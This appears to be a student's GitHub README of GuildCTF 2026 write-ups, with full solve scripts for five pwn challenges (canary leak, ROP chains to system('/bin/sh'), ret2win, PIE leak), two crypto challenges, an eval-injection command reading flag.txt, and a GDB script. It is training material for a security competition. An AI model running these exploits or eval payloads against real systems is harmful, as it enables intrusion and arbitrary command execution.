# GuildCTF 2026 Writeups

**Ayaan Husain** — MA26B003 — ma26b003@smail.iitm.ac.in

Solve scripts for the challenges I fully solved in GuildCTF 2026.

**Total score: 2048** — 11 challenges solved across Binary Exploitation, Cryptography, and Miscellaneous.

---

## Table of Contents

- [How to Run](#how-to-run)
- [Dependencies](#dependencies)
- [Binary Exploitation](#binary-exploitation)
  - [GOT a name? (100)](#got-a-name-100)
  - [I like Buffets (100)](#i-like-buffets-100)
  - [what's yo name (100)](#whats-yo-name-100)
  - [what's yo name returns (323)](#whats-yo-name-returns-323)
  - [what's yo name returns again (723)](#whats-yo-name-returns-again-723)
- [Cryptography](#cryptography)
  - [R my SA (100)](#r-my-sa-100)
  - [Monty Python's Flying Casino (660)](#monty-pythons-flying-casino-660)
- [Miscellaneous](#miscellaneous)
  - [EAassyy Stufff (20)](#eaassyy-stufff-20)
  - [It's definitely normal (50)](#its-definitely-normal-50)
  - [findmypassword (100)](#findmypassword-100)

---

## How to Run

### Pwn challenges and the Casino challenge

These scripts connect to a remote instance. Pass the host and port as arguments:

```bash
python3 solve.py <HOST> <PORT>
```

Example:

```bash
python3 solve.py 10.21.232.223 45335
```

For local testing against the provided binary (where applicable), the pwn scripts fall back to `process('./chal')` when no arguments are given:

```bash
chmod +x chal
python3 solve.py
```

### R my SA

Runs standalone. The `n`, `e`, `ct` values are hardcoded in the script, matching the challenge's `output.txt`.

```bash
cd crypto/r_my_sa
python3 solve.py
```

### It's definitely normal

Reads the local `transcript.txt` file.

```bash
cd misc/its_definitely_normal
python3 solve.py
```

### findmypassword

GDB command script.

```bash
cd misc/findmypassword
chmod +x basic_rev
gdb -q -x solve.gdb ./basic_rev
```

---

## Dependencies

```bash
pip install pwntools sympy pycryptodome ROPgadget
```

GDB is required for `misc/findmypassword/solve.gdb`.

---

## Binary Exploitation

### GOT a name? (100)

**Flag:** `exploiitm{th6t_W65n'T_y0Ur_nAm3!!}`

**Path:** `pwn/got_a_name/solve.py`

```python
#!/usr/bin/env python3
"""
GuildCTF 2026 - GOT a name?
Category: Pwn
Challenge Flag: exploiitm{th6t_W65n'T_y0Ur_nAm3!!}

Usage:
    python3 solve.py <HOST> <PORT>
    python3 solve.py                   # run ./chal locally
"""
from pwn import *
import sys

context.binary = elf = ELF('./chal')
context.log_level = 'info'

HOST = sys.argv[1] if len(sys.argv) > 1 else None
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else None

def start():
    if HOST and PORT:
        return remote(HOST, PORT)
    return process('./chal')

p = start()

# 1) Leak the stack canary via format string
p.recvuntil(b'What is your name?')
p.sendline(b'%15$p')
p.recvuntil(b'Hello ')
canary = int(p.recvline().strip(), 16)
log.success(f'Canary: {hex(canary)}')

# 2) Overflow via gets, build ROP chain
p.recvuntil(b'Retype name for confirmation')

pop_rdi = 0x40122e       # pop rdi; ret
ret     = 0x40122f       # plain ret for stack alignment
bin_sh  = 0x402004       # "/bin/sh"
system  = 0x4010c0       # system@plt

payload  = b'A' * 40
payload += p64(canary)
payload += b'B' * 8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)
p.interactive()
```

---

### I like Buffets (100)

**Flag:** `exploiitm{w04H_y0u_br0k3_my_$essi0n_1d's_d4mn}`

**Path:** `pwn/i_like_buffets/solve.py`

```python
#!/usr/bin/env python3
"""
GuildCTF 2026 - I like Buffets
Category: Pwn
Challenge Flag: exploiitm{w04H_y0u_br0k3_my_$essi0n_1d's_d4mn}

Usage:
    python3 solve.py <HOST> <PORT>
    python3 solve.py                   # run ./chal locally
"""
from pwn import *
import sys

context.binary = elf = ELF('./chal')
context.log_level = 'info'

HOST = sys.argv[1] if len(sys.argv) > 1 else None
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else None

def start():
    if HOST and PORT:
        return remote(HOST, PORT)
    return process('./chal')

p = start()

# Customer ID: any value the program accepts
p.recvuntil(b'Enter you Customer ID : ')
p.sendline(b'0')

# Username: 312 bytes padding + magic value
p.recvuntil(b'Enter your Username : ')
magic = 0xff293a6365737963
payload = b'A' * 312 + p64(magic)
p.sendline(payload)

p.interactive()
```

---

### what's yo name (100)

**Flag:** `exploiitm{s1mply_l0v3ly}`

**Path:** `pwn/whats_yo_name/solve.py`

```python
#!/usr/bin/env python3
"""
GuildCTF 2026 - what's yo name
Category: Pwn
Challenge Flag: exploiitm{s1mply_l0v3ly}

Usage:
    python3 solve.py <HOST> <PORT>
    python3 solve.py                   # run ./chal locally
"""
from pwn import *
import sys

context.binary = elf = ELF('./chal')
context.log_level = 'info'

HOST = sys.argv[1] if len(sys.argv) > 1 else None
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else None

def start():
    if HOST and PORT:
        return remote(HOST, PORT)
    return process('./chal')

p = start()

win = 0x4011f6
payload = b'A' * 40 + p64(win)

p.recvuntil(b'Helo who ar yo?')
p.sendline(payload)
p.interactive()
```

---

### what's yo name returns (323)

**Flag:** `exploiitm{y0u_Mu5t_l1k3_r0P}`

**Path:** `pwn/whats_yo_name_returns/solve.py`

```python
#!/usr/bin/env python3
"""
GuildCTF 2026 - what's yo name returns
Category: Pwn
Challenge Flag: exploiitm{y0u_Mu5t_l1k3_r0P}

Usage:
    python3 solve.py <HOST> <PORT>
    python3 solve.py                   # run ./chal locally
"""
from pwn import *
import sys

context.binary = elf = ELF('./chal')
context.log_level = 'info'

HOST = sys.argv[1] if len(sys.argv) > 1 else None
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else None

def start():
    if HOST and PORT:
        return remote(HOST, PORT)
    return process('./chal')

p = start()

pop_rdi   = 0x4012b5
win       = 0x4011f6
INT32_MIN = 0xffffffff80000000   # sign-extended

payload  = b'A' * 40
payload += p64(pop_rdi)
payload += p64(INT32_MIN)
payload += p64(win)

p.recvuntil(b'Hi who is it?')
p.sendline(payload)
p.interactive()
```

---

### what's yo name returns again (723)

**Flag:** `exploiitm{h0w_j0ble3s_w3re_y0u?_b3_H0n3sT}`

**Path:** `pwn/whats_yo_name_returns_again/solve.py`

```python
#!/usr/bin/env python3
"""
GuildCTF 2026 - what's yo name returns again
Category: Pwn
Challenge Flag: exploiitm{h0w_j0ble3s_w3re_y0u?_b3_H0n3sT}

Usage:
    python3 solve.py <HOST> <PORT>
    python3 solve.py                   # run ./chal locally
"""
from pwn import *
import ctypes, sys

context.binary = elf = ELF('./chal')
context.log_level = 'info'

HOST = sys.argv[1] if len(sys.argv) > 1 else None
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else None

# Find a seed S whose rand(S)[2..4] contain no whitespace bytes
libc = ctypes.CDLL("libc.so.6")
ws = set(b'\x09\x0a\x0b\x0c\x0d\x20')

def has_ws(data):
    return any(b in ws for b in data)

def find_seed():
    for s in range(1, 500000):
        if any(b in ws for b in s.to_bytes(4, 'little')):
            continue
        libc.srand(s)
        vals = [libc.rand() for _ in range(5)]
        nums2 = vals[2:5]
        if all(b not in ws for v in nums2 for b in v.to_bytes(4, 'little')):
            return s, nums2
    raise Exception("no seed found")

S, nums2 = find_seed()
log.info(f'Seed S = {S}')
log.info(f'nums2  = {[hex(v) for v in nums2]}')

def start():
    if HOST and PORT:
        return remote(HOST, PORT)
    return process('./chal')

for attempt in range(30):
    try:
        p = start()

        # 1) Leak PIE
        p.sendline(b'A' * 44 + b'%13$p')
        data = p.recvuntil(b'Please confirm your name once again : ', timeout=5)
        pie_base = int(data.split(b'\n')[0], 16) - 0x1437
        log.success(f'PIE base: {hex(pie_base)}')

        ret_gadget             = pie_base + 0x101a
        get_username           = pie_base + 0x12f1
        print_user_credentials = pie_base + 0x1234

        # 2) get_name return -> get_username
        p2 = b'A' * 56 + p64(ret_gadget) + p64(get_username)
        if has_ws(p2[56:]):
            p.close(); continue
        p.sendline(p2)

        # 3) call 1 scanf #1 -> overwrite seed
        p.recvuntil(b'Enter your username: ')
        p3  = b'A' * 8 + p32(S) + b'AAAA' + b'B' * 12 + b'CCCC' + b'D' * 12
        if has_ws(p3):
            p.close(); continue
        p.sendline(p3)

        # 4) call 1 scanf #2 -> user_id overflow -> get_username
        p.recvuntil(b'Enter your User ID: ')
        p4 = b'A' * 56 + p64(ret_gadget) + p64(get_username)
        if has_ws(p4[56:]):
            p.close(); continue
        p.sendline(p4)

        # 5) call 2 scanf #1 -> overwrite nums2
        p.recvuntil(b'Enter your username: ')
        p5  = b'A' * 8 + b'AAAA' + b'AAAA' + b'B' * 12 + b'CCCC'
        p5 += b''.join(p32(v) for v in nums2)
        if has_ws(p5):
            p.close(); continue
        p.sendline(p5)

        # 6) call 2 scanf #2 -> user_id overflow -> print_user_credentials
        p.recvuntil(b'Enter your User ID: ')
        p6 = b'A' * 56 + p64(ret_gadget) + p64(print_user_credentials)
        if has_ws(p6[56:]):
            p.close(); continue
        p.sendline(p6)

        out = p.recvall(timeout=5)
        if b'exploiitm{' in out:
            log.success("FLAG RECEIVED")
            print(out.decode(errors='replace'))
            break
        else:
            log.warning(f'attempt {attempt}: no flag, retrying')
            p.close()

    except Exception as e:
        log.warning(f'attempt {attempt} failed: {e}')
        try: p.close()
        except: pass
```

---

## Cryptography

### R my SA (100)

**Flag:** `exploiitm{s0_y0u_kn0w_h0w_t0_f4ct0r153_huh}`

**Path:** `crypto/r_my_sa/solve.py`

```python
#!/usr/bin/env python3
"""
GuildCTF 2026 - R my SA
Category: Cryptography
Challenge Flag: exploiitm{s0_y0u_kn0w_h0w_t0_f4ct0r153_huh}

Runs standalone. Values of n, e, ct match the challenge's output.txt.
"""
import sympy


n  = 610870240865234529907743614451858801440155492757079465096710603276200472290332312307451743490652760649679857285194802523705355655732590457358769052210759328095574632949925216971079564253285551079681286819576086292966982023640170817829686489069479455782174911021436314674483460806303999075272232571864598274720703485318203442053573948268875433041811318199331
e  = 65537
ct = 269502667676232352065057019549198430447003590244768780011937512108750638388052071680107935792375411406856203708540602606052505183332456367255459084740242095067533827164103921553415851493514793496968994176547304138220110710286537331520492430193350534011015869917837578280239839478693713969444834925766299298505300587378553503027879397491554035163970710898956


def long_to_bytes(x):
    if x == 0:
        return b'\x00'
    out = b''
    while x > 0:
        out = bytes([x & 0xff]) + out
        x >>= 8
    return out


print(f"[*] n is {n.bit_length()} bits")

fac = sympy.factorint(n)
print(f"[*] n has {len(fac)} distinct prime factors")

phi = 1
for p, k in fac.items():
    phi *= (p - 1) * (p ** (k - 1))

d = pow(e, -1, phi)
m = pow(ct, d, n)

print(f"[+] Flag: {long_to_bytes(m).decode(errors='replace')}")
```

---

### Monty Python's Flying Casino (660)

**Flag:** `exploiitm{P0hl1g_L1k35_5m00th_curv35}`

**Path:** `crypto/flying_casino/solve.py`

```python
#!/usr/bin/env python3
"""
GuildCTF 2026 - Monty Python's Flying Casino
Category: Crypto
Challenge Flag: exploiitm{P0hl1g_L1k35_5m00th_curv35}

Usage:
    python3 solve.py <HOST> <PORT>
    python3 solve.py 10.21.232.223 42264
"""
from pwn import *
import re, random, sys

context.log_level = 'error'

if len(sys.argv) < 3:
    print("Usage: python3 solve.py <HOST> <PORT>")
    sys.exit(1)

HOST = sys.argv[1]
PORT = int(sys.argv[2])

CASINO_WIN = int.from_bytes(b"You've been pwned", 'big')
print(f"[*] Target: wallet > {CASINO_WIN}")

p = remote(HOST, PORT)
p.recvuntil(b'6. Exit\n')

wallet = 1_000_000

def do_coin_bet(guess, bet):
    p.sendline(b'1')
    p.recvuntil(b"'heads' or 'tails'? ")
    p.sendline(guess.encode())
    p.recvuntil(b'sacred wager of gold coins: ')
    p.sendline(str(bet).encode())
    data = p.recvuntil(b'coins\n', timeout=15)
    m = re.search(rb'Wallet of wondrousness: (\d+) coins', data)
    if not m:
        print("[!] Parse error:", data)
        sys.exit(1)
    return int(m.group(1))

bets = 0
while wallet <= CASINO_WIN:
    guess = random.choice(['heads', 'tails'])
    bet = max(2, int(wallet * 0.1))
    if bet > wallet:
        bet = wallet
    wallet = do_coin_bet(guess, bet)
    bets += 1
    if bets % 200 == 0:
        print(f"[*] bet {bets}: wallet = {wallet}")

print(f"[+] Reached wallet = {wallet} after {bets} bets")

# Ask for a legitimate signature
p.recvuntil(b'6. Exit\n')
p.sendline(b'4')
data = p.recvuntil(b'6. Exit\n', timeout=10)
lines = data.split(b'\n')
code = None
for i, line in enumerate(lines):
    if line.startswith(b'Amount:'):
        code = lines[i-1].strip()
        break
if code is None:
    print("[!] Could not find code in:", data)
    sys.exit(1)
print(f"[+] Signed code: {code.decode()}")

# Claim payout
p.sendline(b'5')
p.recvuntil(b'claim: ')
p.sendline(str(wallet).encode())
p.recvuntil(b'code: ')
p.sendline(code)
out = p.recvall(timeout=10)
print(out.decode(errors='replace'))
```

---

## Miscellaneous

### EAassyy Stufff (20)

**Flag:** `exploiitm{7urns_0uT_kRlshItH_wA5_wR0nG}`

**Path:** `misc/eaassyy_stufff/solve.txt`

```
GuildCTF 2026 - EAassyy Stufff
Category: Misc
Challenge Flag: exploiitm{7urns_0uT_kRlshItH_wA5_wR0nG}

The remote service evaluates arbitrary Python expressions. Confirmed by
sending a bare string ("hello") which was echoed back, and by sending
__import__('os') which returned <module 'os' (frozen)>. Connected via:

    nc <HOST> <PORT>

Then executed a shell command server-side via a single expression:

    __import__('os').popen('cat flag.txt').read()

The server returned the contents of flag.txt, which was the flag.
```

---

### It's definitely normal (50)

**Flag:** `exploiitm{00H_SP3C14l_ch4R4cT3R2}`

**Path:** `misc/its_definitely_normal/solve.py`

```python
#!/usr/bin/env python3
"""
GuildCTF 2026 - It's definitely normal
Category: Misc
Challenge Flag: exploiitm{00H_SP3C14l_ch4R4cT3R2}

Reads transcript.txt, extracts all U+200B (zero-width space) positions,
takes the gaps between them (including the leading gap from byte 0),
and converts each gap to a character.
"""
with open('transcript.txt', 'r', encoding='utf-8') as f:
    text = f.read()

ZW = '\u200b'
positions = [i for i, c in enumerate(text) if c == ZW]
print(f"[*] Found {len(positions)} zero-width spaces")

gaps = [positions[0]] + [
    positions[i + 1] - positions[i] - 1
    for i in range(len(positions) - 1)
]

flag = ''.join(chr(g) for g in gaps)
print(f"[+] Flag: {flag}")
```

---

### findmypassword (100)

**Flag:** `exploiitm{th1$_1S_C4l13d_r3v3Rse_Eng1ne3r1ng}`

**Path:** `misc/findmypassword/solve.gdb`

```
# solve.gdb - GuildCTF 2026 "findmypassword"
#
# Usage:
#   chmod +x basic_rev
#   gdb -q -x solve.gdb ./basic_rev
#
# The binary has two globals, enc_arr and xor_arr, and an integer pass_length.
# The password is recovered by XORing the two arrays element-wise.

start

# Print the password length
printf "pass_length = "
p *(int*)&pass_length

# Dump the first 45 bytes of each array
printf "\nenc_arr:\n"
x/45bx &enc_arr

printf "\nxor_arr:\n"
x/45bx &xor_arr

# Recover the password
printf "\nRecovered password:\n"
set $i = 0
while $i < 45
    printf "%c", ((int*)&enc_arr)[$i] ^ ((int*)&xor_arr)[$i]
    set $i = $i + 1
end
printf "\n"

quit
```

---

## Repository Layout

```
guildctf_2026_writeups/
├── README.md
├── pwn/
│   ├── got_a_name/solve.py
│   ├── i_like_buffets/solve.py
│   ├── whats_yo_name/solve.py
│   ├── whats_yo_name_returns/solve.py
│   └── whats_yo_name_returns_again/solve.py
├── crypto/
│   ├── r_my_sa/solve.py
│   └── flying_casino/solve.py
└── misc/
    ├── eaassyy_stufff/solve.txt
    ├── its_definitely_normal/solve.py
    └── findmypassword/solve.gdb
```

---


